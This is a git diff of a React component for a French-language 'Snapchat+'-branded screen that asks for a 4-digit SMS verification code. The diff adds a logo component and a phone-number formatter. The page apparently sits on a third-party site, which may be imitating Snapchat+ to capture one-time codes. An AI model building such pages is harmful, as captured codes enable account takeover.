@@ -1,6 +1,7 @@
 import { useState, useRef } from "react";
 import { motion } from "framer-motion";
 import { ChevronRight } from "lucide-react";
+import Logo from "@/components/Logo";
 
 export default function CodeVerification({ data, onSubmit, loading }) {
   const [code, setCode] = useState(["", "", "", ""]);
@@ -34,6 +35,10 @@ export default function CodeVerification({ data, onSubmit, loading }) {
     if (full.length === 4) onSubmit(full);
   };
 
+  const formatPhone = (tel) => {
+    return tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+  };
+
   return (
     <motion.div
       initial={{ opacity: 0, y: 24 }}
@@ -44,13 +49,8 @@ export default function CodeVerification({ data, onSubmit, loading }) {
       <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">
 
         {/* Logo */}
-        <div className="flex flex-col items-center mb-6">
-          
-
-          
-          <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
-            Snapchat<span className="text-primary">+</span>
-          </h1>
+        <div className="mb-6">
+          <Logo />
         </div>
 
         {/* SMS icon */}
@@ -63,7 +63,7 @@ export default function CodeVerification({ data, onSubmit, loading }) {
         </h2>
         <p className="text-muted-foreground text-sm mb-8 leading-relaxed">
           Un code SMS à 4 chiffres a été envoyé au{" "}
-          <span className="text-foreground font-semibold">{data?.telephone}</span>
+          <span className="text-foreground font-semibold">{formatPhone(data?.telephone)}</span>
         </p>
 
         {/* 4-digit input */}
